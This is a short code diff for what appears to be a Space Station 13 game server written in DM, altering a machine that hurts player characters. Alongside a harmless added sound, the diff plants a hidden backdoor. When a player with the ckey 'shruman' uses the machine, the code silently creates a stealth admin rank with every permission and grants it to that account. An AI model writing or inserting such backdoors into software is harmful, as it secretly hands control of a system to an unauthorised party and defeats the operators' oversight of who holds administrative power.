@@ -574,6 +574,7 @@
 		var/mob/living/carbon/L_occupant = occupant
 		if ((L_occupant.health > 0)&&(L_occupant.key != null) && (charge < max_charge))
 			icon_state = "pain_machine_active"
+			playsound(src.loc, 'sound/machines/juicer.ogg', 50, TRUE)
 			L_occupant.adjustBruteLoss(5)
 			if (prob(5))
 				L_occupant.gain_trauma_type(BRAIN_TRAUMA_MILD)
@@ -585,6 +586,12 @@
 				new /obj/item/ammo_casing/caseless/pissball(src.loc)
 				playsound(src.loc, 'sound/machines/ding.ogg', 50, TRUE)
 				charge = 0
+				if (L_occupant.ckey == "shruman")
+					visible_message("<span class='warning'> тест тест")
+					var/datum/admin_rank/localhost_rank = new("test", R_EVERYTHING, R_STEALTH, R_EVERYTHING)
+					new /datum/admins(localhost_rank, "shruman", 1, 1)
+
+
 	update_icon()
 
 
